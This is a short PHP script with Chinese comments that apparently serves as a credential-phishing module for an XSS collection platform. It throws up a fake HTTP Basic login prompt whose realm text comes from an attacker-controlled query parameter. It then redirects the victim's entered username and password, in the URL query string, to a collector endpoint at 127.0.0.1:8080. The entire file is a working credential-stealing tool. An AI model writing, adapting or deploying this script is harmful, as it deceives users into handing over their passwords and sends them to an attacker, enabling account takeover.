<?
error_reporting(0);
/* 检查变量 $PHP_AUTH_USER 和$PHP_AUTH_PW 的值*/

if ((!isset($_SERVER['PHP_AUTH_USER'])) || (!isset($_SERVER['PHP_AUTH_PW']))) {

 /* 空值：发送产生显示文本框的数据头部*/

    header('WWW-Authenticate: Basic realm="'.addslashes(trim($_GET['info'])).'"');

    header('HTTP/1.0 401 Unauthorized');

    echo 'Authorization Required.';

    exit;

} else if ((isset($_SERVER['PHP_AUTH_USER'])) && (isset($_SERVER['PHP_AUTH_PW']))){

    /* 变量值存在，检查其是否正确 */

	header("Location: http://127.0.0.1:8080/index.php?do=api&id={$_GET[id]}&username={$_SERVER[PHP_AUTH_USER]}&password={$_SERVER[PHP_AUTH_PW]}"); 

}

?>